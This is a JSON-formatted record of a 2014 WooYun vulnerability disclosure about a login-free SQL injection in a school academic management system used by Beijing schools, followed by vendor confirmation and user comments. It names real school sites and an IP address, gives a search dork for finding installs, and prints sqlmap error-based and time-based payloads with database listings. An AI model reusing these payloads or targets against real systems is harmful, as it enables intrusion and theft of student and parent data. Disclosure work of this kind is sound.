{"id": 4764, "wybug_id": "wooyun-2014-052630", "wybug_title": "某通用型教务管理系统SQL注射漏洞（无需登陆）", "wybug_corp": "北京乐知行软件有限公司", "wybug_author": "niliu", "wybug_date": "2014-03-03 16:46", "wybug_open_date": "2014-04-17 16:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-05-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-17：\t细节向公众公开  简要描述： 此套系统北京大部分学校都在使用，系统中涉及学生，家长，教师等个人敏感信息。 详细说明：  先看一下官网介绍都有那些学校在使用\nhttp://www.lezhixing.com.cn/cms/lzx/case/index.jhtml\n北京大部分学校都在使用，包括各个区的教育信息中心\n\n谷歌搜索关键词 ： inurl:datacenter 数字校园  能找到很多，其实每个学校官网都会有登陆地址\n\n漏洞发现方法，由一个弱口令登陆后，发现在学生相片地址处存在SQL注射。上传相片后的地址\nurl+/jw/student/getfile.do?id=\n但是漏洞利用无需登陆，直接在目标系统地址后加上这个链接即可注射举几个例子#1.举例1：中关村三小\nhttp://www.zgc3x.com/jw/student/getfile.do?id=\n\n\n\n\n\navailable databases [9]:[*] data_prd_20131022[*] data_prd_v3[*] data_prd_v3_pk_bak0730[*] information_schema[*] mailpublic[*] mysql[*] openfire[*] performance_schema[*] test\n#2.\n举例2：北京中芯学校http://1.202.236.46/jw/student/getfile.do?id=\n\n\n\nPlace: GETParameter: id    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: id=-3994' AND (SELECT 1370 FROM(SELECT COUNT(*),CONCAT(0x717a697571,(SELECT (CASE WHEN (1370=1370) THEN 1 ELSE 0 END)),0x7161616a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'Byzi'='Byzi    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=-3994' AND SLEEP(5) AND 'uoFu'='uoFuDBA权限数据库available databases [7]:[*] data_prd[*] data_prd_bak_20130717[*] data_prd_bak_20140212[*] information_schema[*] mysql[*] openfire[*] performance_schema\n#3。\n例子3：http://www.zgc3x.com/jw/student/getfile.do?id=北师大三附中\n\n\n还有很多，就随便选了3个，都是DBA权限。   漏洞证明：  可以看到系统中包含了大量敏感信息，家长短信，家长信息，学生信息等等\n\n\n\n   修复方案：  过滤相关参数。   版权声明：转载请注明来源 niliu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2014-03-08 11:28 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-03 17:08 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  突然脑子错觉出现正方    \n     2014-03-03 18:28 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  无需登录    \n     2014-03-08 16:21 |    \t\tHaswell \t\t\t( 普通白帽子  |\t\t\t        Rank:167 漏洞数:18        | HorizonSec @ RDFZ)\t\t \n  乐知行数字校园吗……求透露Q_Q    \n     2014-03-08 17:22 |    \t\t动后河 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:13        | ☭)\t\t \n  教务系统也能有sql注入，唉，我怎么就遇不到    \n     2014-04-12 14:34 |    \t\tCoffee \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:15        | Corie, a student of RDFZ.)\t\t \n  可惜我们学校登录验证直接连的ad，貌似没存几个用户。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}